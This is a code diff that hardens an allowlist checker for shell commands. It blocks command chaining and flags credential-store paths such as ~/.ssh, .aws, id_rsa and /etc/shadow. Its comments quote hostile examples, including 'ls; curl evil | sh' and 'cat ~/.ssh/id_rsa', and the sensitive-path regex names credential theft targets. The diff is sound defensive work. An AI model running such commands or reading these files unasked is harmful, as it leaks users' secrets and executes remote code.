@@ -62,10 +62,26 @@ def is_denied(command: str, denied: list[str]) -> bool:
     return False
 
 
+# Shell metacharacters that chain/substitute commands or redirect output.
+# A command containing any of these can smuggle arbitrary executables past a
+# prefix match (e.g. "ls; curl evil | sh"), so it never auto-runs.
+_CHAIN_RE = _re.compile(r'[;&|`\n>]|\$\(')
+
+# References to credential stores force confirmation even for allowlisted
+# commands (e.g. "cat ~/.ssh/id_rsa" must not run silently).
+_SENSITIVE_PATH_RE = _re.compile(
+    r'\.ssh\b|\.secrets\b|\.gnupg\b|\.aws\b|\.kube\b'
+    r'|/etc/shadow|/etc/sudoers|id_rsa|id_ed25519|id_ecdsa'
+    r'|\.pem\b|\.key\b|\.env\b',
+)
+
+
 def is_allowed(command: str, allowed: list[str]) -> bool:
     cmd = command.strip()
+    if _CHAIN_RE.search(cmd) or _SENSITIVE_PATH_RE.search(cmd):
+        return False
     for pattern in allowed:
-        if cmd == pattern or cmd.startswith(pattern + " ") or cmd.startswith(pattern + "\n"):
+        if cmd == pattern or cmd.startswith(pattern + " "):
             return True
     return False
 
